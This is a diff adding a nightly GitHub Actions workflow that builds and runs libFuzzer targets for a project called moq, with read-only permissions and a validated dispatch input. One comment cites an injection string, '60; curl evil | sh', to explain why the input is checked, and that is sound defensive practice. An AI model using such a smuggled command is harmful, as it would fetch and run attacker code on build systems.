@@ -1,0 +1,89 @@
+name: Nightly Fuzz
+
+on:
+  schedule:
+    # 05:00 UTC daily - offset from the 06:00 seed sweep so the two heavy
+    # nightly jobs don't contend for runners.
+    - cron: '0 5 * * *'
+  workflow_dispatch:
+    inputs:
+      max_total_time:
+        description: 'Wall-clock seconds to fuzz each target'
+        required: false
+        default: '60'
+        # Constrain the dispatch UI to a number. This is a convenience guard
+        # only -- not relied upon for safety: the value is still validated as a
+        # plain integer in the shell below before use.
+        type: number
+
+# Least-privilege: this workflow only checks out, builds, and fuzzes. No write
+# scopes are needed, so cap the GITHUB_TOKEN at read-only repository contents.
+permissions:
+  contents: read
+
+jobs:
+  long-fuzz:
+    name: Long Fuzz (libFuzzer)
+    runs-on: ubuntu-latest
+    env:
+      CC: clang
+      CXX: clang++
+    steps:
+      - uses: actions/checkout@v4
+
+      # Same libFuzzer toolchain principle as the PR fuzz-smoke lane: install
+      # Clang + compiler-rt so the runtime is linkable deterministically.
+      - name: Install LLVM/Clang
+        run: sudo apt-get update && sudo apt-get install -y clang llvm
+
+      # Fuzz binaries only: moq-core plus the five targets. The media/sim/test
+      # options default ON, so disable them explicitly to keep the nightly
+      # build dependency-light and fast. MOQ_REQUIRE_FUZZ=ON keeps a missing
+      # libFuzzer a hard error, never a silent skip (CI-only flag; not in
+      # CMakePresets, so local Apple-clang dev is unaffected).
+      - name: Configure
+        run: >
+          cmake -B build/fuzz-ci
+          -DMOQ_BUILD_FUZZ=ON
+          -DMOQ_REQUIRE_FUZZ=ON
+          -DMOQ_BUILD_TESTS=OFF
+          -DMOQ_BUILD_SIM=OFF
+          -DMOQ_BUILD_LOC=OFF
+          -DMOQ_BUILD_CMAF=OFF
+          -DMOQ_BUILD_MEDIA_OBJECT=OFF
+
+      - name: Build
+        run: cmake --build build/fuzz-ci
+
+      # Bounded run: each target fuzzes for max_total_time seconds, seeded
+      # from its committed corpus where one exists. New inputs, per-target
+      # logs, and any crash/oom/timeout reproducers land under fuzz-artifacts.
+      - name: Fuzz (bounded)
+        # Pass the dispatch input through an env var (never interpolated into
+        # the command text) and validate it as a plain integer before use, so a
+        # value like "60; curl evil | sh" or "$(...)" cannot reach the shell as
+        # syntax. Scheduled runs have no inputs, so this defaults to 60.
+        env:
+          FUZZ_MAX_TOTAL_TIME: ${{ github.event.inputs.max_total_time || '60' }}
+        run: |
+          case "$FUZZ_MAX_TOTAL_TIME" in
+            ''|*[!0-9]*)
+              echo "invalid max_total_time: '$FUZZ_MAX_TOTAL_TIME'" \
+                   "(expected a non-negative integer)" >&2
+              exit 1 ;;
+          esac
+          scripts/run_fuzzers.sh \
+            --build-dir build/fuzz-ci \
+            --max-total-time "$FUZZ_MAX_TOTAL_TIME" \
+            --artifacts fuzz-artifacts
+
+      # On failure, upload logs + reproducers (crash-*/oom-*/timeout-*) so a
+      # finding is reproducible with: <target> <reproducer-file>.
+      - name: Upload fuzz artifacts
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: fuzz-artifacts
+          path: fuzz-artifacts/**
+          retention-days: 14
+          if-no-files-found: warn
